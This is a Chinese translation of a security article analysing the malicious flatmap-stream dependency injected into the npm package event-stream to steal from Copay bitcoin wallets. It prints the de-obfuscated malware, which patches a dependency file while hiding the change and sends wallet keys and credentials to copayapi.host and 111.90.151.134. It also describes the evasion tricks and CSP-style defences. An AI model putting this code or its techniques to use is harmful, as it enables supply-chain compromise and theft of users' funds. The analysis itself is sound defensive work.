> * 原文地址：[Compromised npm Package: event-stream](https://medium.com/intrinsic/compromised-npm-package-event-stream-d47d08605502)
> * 原文作者：[Thomas Hunter II](https://medium.com/@tlhunter?source=post_header_lockup)
> * 译文出自：[掘金翻译计划](https://github.com/xitu/gold-miner)
> * 本文永久链接：[https://github.com/xitu/gold-miner/blob/master/TODO1/compromised-npm-package-event-stream.md](https://github.com/xitu/gold-miner/blob/master/TODO1/compromised-npm-package-event-stream.md)
> * 译者：[CoderMing](https://github.com/coderming)
> * 校对者：[格子熊](https://github.com/KarthusLorin)，[caoyi](https://github.com/caoyi0905)
 # 被污染的 npm 包：event-stream
 ![](https://cdn-images-1.medium.com/max/800/1*OB_BwZtUSGuM15X6xFsrWw.png)
一个著名的 npm 包 [`event-stream`](https://github.com/dominictarr/event-stream) 的作者，将其转让给了一个恶意用户 [right9ctrl](https://github.com/right9ctrl)。这个包每个月有超过 [150万](https://www.npmjs.com/package/event-stream) 次下载，同时其被 1,600 个其它的 npm 包依赖。恶意用户通过持续地向这个包贡献代码来获得了其原作者的信任。这个 npm 包由恶意用户发布的第一个版本时间是 2018 年 9 月 4 日。

恶意用户修改了 `event-stream`，让其依赖了一个恶意 npm 包 [`flatmap-stream`](https://github.com/hugeglass/flatmap-stream)。这个 npm 包是专门针对这次攻击所制作的。它包括了一个相当简单的 `index.js` 文件，同时也有一个压缩版的 `index.min.js` 文件。在 GitHub 上，这两个文件看起来完全没问题。然而，在 npm 上发行的代码并没有被要求与 git 仓库中所存储的代码相同。

这个被插入到 `event-stream` 中的恶意 npm 包在 10 月 20 日被其他用户发现并在 [dominictarr/event-stream#116](https://github.com/dominictarr/event-stream/issues/116#issuecomment-441759047) 中曝光。这个 issue 在恶意 npm 包发布两个月后才被创建。开源软件的一大好处是能够集众多开发者之力，但这并不是毫无坏处的。例如 OpenSSL，这个开源项目有着几乎最严格的代码审查，但是其仍然有许多不足之处，例如 Heartbleed 漏洞（译者注：可参考 http://heartbleed.com/）。

 ### 恶意 npm 包做了什么？
该恶意 npm 包是一种针对性很强的攻击。它最终会对一个开源 App [bitpay/copay](https://github.com/bitpay/copay) 发起攻击。该 App 的 README 中提到：_Copay 是一个支持桌面端和移动端的安全比特币钱包平台_。我们知道恶意 npm 包只针对这个应用是因为其会读取项目 `package.json` 文件中的 `description` 字段，并用其去解码一个 **AES256** 加密的代码段。

对于其他项目， `description` 字段不能够用于给加密代码段解密，之后 hack 操作将会悄悄终止。 而 [bitpay/copay的 description 字段](https://github.com/bitpay/copay/blob/90336ef9fb4cc3a90a026827be27a32348d3615c/package.json#L3)，也就是 `A Secure Bitcoin Wallet`，是解密这些数据（加密代码段）的key。

 `flatmap-stream` 这个包巧妙地将数据隐藏在了 `test` 文件夹中。这个文件夹在 GitHub 不可见但却出现在了实际的 [`flatmap-stream-0.1.1.tgz`](https://registry.npmjs.org/flatmap-stream/-/flatmap-stream-0.1.1.tgz) 包中。这些加密的数据以一个数组的形式存储，数据的每一部分都被压缩及混淆过，同时也以不同的参数进行了加密。一部分加密的数据包括了一些会被静态数据统计工具警告为恶意行为的方法名，例如 `_compile` 这个在 `require` 中意味着创建一个新 Module 的字符串。在下面两段示例代码中，我尽我所能去清理了这些文件让代码更易读。

​	这是第一部分。它不怎么有意思，最有可能出现于一个 bootstrap 内的函数来用于引入第二段代码。它看起来是通过修改子模块中的一个名为 `ReedSolomonDecoder.js` 的子模块来使用的。如果该文件中已经有了 `/*@@*/` 这个字符串，那么它就什么都不做。如果尚未对其进行修改，那么它不仅会修改文件，还会将访问权限和修改后的时间戳替换为原来的值。这样做的话，当你看你磁盘中的文件时，你就不会注意到它已经被修改了。

 ```
/*@@*/
module.exports = function (e) {
  try {
    if (!/build\:.*\-release/.test(process.argv[2])) return;
    var desc = process.env.npm_package_description;
    var fs = require("fs");
    var decoderPath = "./node_modules/@zxing/library/esm5/core/common/reedsolomon/ReedSolomonDecoder.js";
    var decoderStat = fs.statSync(decoderPath);
    var decoderSource = fs.readFileSync(decoderPath, "utf8");
    var decipher = require("crypto").createDecipher("aes256", desc);
    var s = decipher.update(e, "hex", "utf8");
    s = "\n" + (s += decipher.final("utf8"));
    var a = decoderSource.indexOf("\n/*@@*/");
    if (0 <= a) {
      (decoderSource = decoderSource.substr(0, a));
      fs.writeFileSync(decoderPath, decoderSource + s, "utf8");
      fs.utimesSync(decoderPath, decoderStat.atime, decoderStat.mtime);
      process.on("exit", function () {
        try {
          fs.writeFileSync(decoderPath, decoderSource, "utf8");
          fs.utimesSync(decoderPath, decoderStat.atime, decoderStat.mtime);
        } catch (err) {}
      });
    }
  } catch (err) {}
};
 ```
第二部分就更有趣了。我将一些多余的代码段被删掉了，来凸显出其原意图：
 ```
/*@@*/
function doBadStuff() {
  try {
    const http = require("http");
    const crypto = require("crypto");
    const publicKey = "-----BEGIN PUBLIC KEY-----\n...TRUNCATED...\n-----END PUBLIC KEY-----";
     function sendRequest(hostname, path, body) {
      // Original request "decodes" a hex representation of the hostnames
      // hostname = Buffer.from(hostname, "hex").toString();
       const req = http.request({
        hostname: hostname,
        port: 8080,
        method: "POST",
        path: "/" + path, // path will be /p or /c
        headers: {
          "Content-Length": body.length,
          "Content-Type": "text/html"
        }
      }, function() {});
       req.on("error", function(err) {});
       req.write(body);
       req.end();
    }
     function sendRequests(path, rawStringPayload) {
      // path = "c" || "p"
      let payload = "";
      for (let i = 0; i < rawStringPayload.length; i += 200) {
        const chunk = rawStringPayload.substr(i, 200);
        payload += crypto.publicEncrypt(
          publicKey,
          Buffer.from(chunk, "utf8")
        ).toString("hex") + "+";
      }
       sendRequest("copayapi.host", path, payload);
      sendRequest("111.90.151.134", path, payload);
    }
     function getDataFromStorage(name, callback) {
      if (window.cordova) {
        try {
          const dd = cordova.file.dataDirectory;
          resolveLocalFileSystemURL(dd, function(localFs) {
            localFs.getFile(name, {
              create: false
            }, function(file) {
              file.file(function(contents) {
                const fileReader = new FileReader;
                fileReader.onloadend = function() {
                  return callback(JSON.parse(fileReader.result))
                };
                fileReader.onerror = function(err) {
                  fileReader.abort()
                };
                fileReader.readAsText(contents)
              })
            })
          })
        } catch (err) {}
      } else {
        try {
          const data = localStorage.getItem(name);
           if (data) {
            return callback(JSON.parse(data));
          }
           chrome.storage.local.get(name, function(entry) {
            if (entry) {
              return callback(JSON.parse(entry[name]));
            }
          })
        } catch (err) {}
      }
    }
     global.CSSMap = {};
     getDataFromStorage("profile", function(data) {
      for (let credential in data.credentials) {
        const creds = data.credentials[credential];
        if ("livenet" == creds.network) {
          getDataFromStorage("balanceCache-" + creds.walletId, function(data) {
            const self = this;
            self.balance = parseFloat(data.balance.split(" ")[0]);
             if ("btc" == self.coin && self.balance < 100 || "bch" == self.coin && self.balance < 1000) {
              global.CSSMap[self.xPubKey] = true;
            }
             sendRequests("c", JSON.stringify(self));
          }.bind(creds))
        }
      }
    });
     const Credentials = require("bitcore-wallet-client/lib/credentials.js");
    // Intercept the getKeys function in the Credentails class
    Credentials.prototype.getKeysFunc = Credentials.prototype.getKeys;
    Credentials.prototype.getKeys = function(keyLookup) {
      const originalResult = this.getKeysFunc(keyLookup);
      try {
        if (global.CSSMap && global.CSSMap[this.xPubKey]) {
          delete global.CSSMap[this.xPubKey];
          sendRequests("p", keyLookup + "\t" + this.xPubKey);
        }
      } catch (err) {}
       return originalResult;
    }
  } catch (err) {}
}
 // Run as soon as ready
window.cordova
  ? document.addEventListener("deviceready", doBadStuff)
  : doBadStuff()
 ```
这个文件像是个 `bitcore-wallet-client` 包打了猴子补丁，特别是 `Credentials` 类的 `getKeys` 方法，它备份了原有函数，然后将钱包内的凭证传到第三方服务器。这个服务器位于 `111.90.151.134`。这些凭证可能被用来获取用户账户的访问权限，然后允许攻击者从原账户主那里窃取资金。

这个 npm 包在企图避免侦测上做了很多事情。例如，它不会在使用测试的比特币网络即 `testnet` 上运行，它只会在实际的比特币网络 `livenet` 中运行。如果受感染的应用在做网络测试，这将会避免其被发现。它同时只会在被打包成 release 版本时运行安装引导程序（译者注：即上文中第一段代码，加载恶意代码）。它通过查看 `process.argv` 中的第一个参数来使用正则表达式 `/build\:.*\-release/` 进行匹配，如果没有匹配到，那这次流程就可能是被某类 build server 运作的。

 ### 如何防御这次攻击?
通过使用静态分析工具来扫描 npm 包可能是个很棒的想法。但此次攻击对恶意的源代码进行了加密以避免被检测到。为了防止这种攻击，我们必须采取其他的的方法...

这次特定攻击看起来可以同时在传统 web 页面和通过 Cordova（一个将 web App 打包成移动端 App 的工具）构建的 App 中运行。我们已经发现了这次攻击可以通过使用 [CSP (Content Security Policy)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) 来阻止。这是用来指定页面可以与哪些 url 通信并将这些设定通过 web 服务器响应头来指定的标准。Cordova 甚至有其自身的方法 [mechanism](https://cordova.apache.org/docs/en/latest/reference/cordova-plugin-whitelist/index.html#navigation-whitelist) 来指定哪些第三方服务可以使用。然而，[Copay App 似乎禁用了这个特性](https://github.com/bitpay/copay/blob/72a9e176c12c77b5dfc4590c88de73f28fa301b7/app-template/config-template.xml#L121)。

CSP 可以有效地保证前端页面的安全。然而，这个特性没有被内置在 Node.js 中。[Intrinsic](https://intrinsic.com/) 这个 Node.js 包提供了让你可以设定你 App 通信 URL 白名单的功能——这很像 CSP ——而且其可以干更多事情。Intrinsic 可以被用来设置文件系统白名单、子进程白名单、`process` 的细分节点、TCP 和 UDP 连接甚至是细粒度的数据库访问。这些白名单是建立在每条请求路由的，这使得其比防火墙更加强大。

有趣的是，这次在 `event-stream` 中发生的攻击中，攻击者用猴子补丁的方式修改了系统关键函数来实现其向恶意服务器发送 HTTP 请求的目的，这正好是我们之前的这篇文章中所警示的：[The Dangers of Malicious Modules](https://medium.com/intrinsic/common-node-js-attack-vectors-the-dangers-of-malicious-modules-863ae949e7e8)。随着时间的推移，这些基于代码依赖链的攻击只会越来越频繁。这种高针对性的攻击（例如这次针对 Copay 的）也会变得越来越普遍。


 > 如果发现译文存在错误或其他需要改进的地方，欢迎到 [掘金翻译计划](https://github.com/xitu/gold-miner) 对译文进行修改并 PR，也可获得相应奖励积分。文章开头的 **本文永久链接** 即为本文在 GitHub 上的 MarkDown 链接。
---
 > [掘金翻译计划](https://github.com/xitu/gold-miner) 是一个翻译优质互联网技术文章的社区，文章来源为 [掘金](https://juejin.im) 上的英文分享文章。内容覆盖 [Android](https://github.com/xitu/gold-miner#android)、[iOS](https://github.com/xitu/gold-miner#ios)、[前端](https://github.com/xitu/gold-miner#前端)、[后端](https://github.com/xitu/gold-miner#后端)、[区块链](https://github.com/xitu/gold-miner#区块链)、[产品](https://github.com/xitu/gold-miner#产品)、[设计](https://github.com/xitu/gold-miner#设计)、[人工智能](https://github.com/xitu/gold-miner#人工智能)等领域，想要查看更多优质译文请持续关注 [掘金翻译计划](https://github.com/xitu/gold-miner)、[官方微博](http://weibo.com/juejinfanyi)、[知乎专栏](https://zhuanlan.zhihu.com/juejinfanyi)。
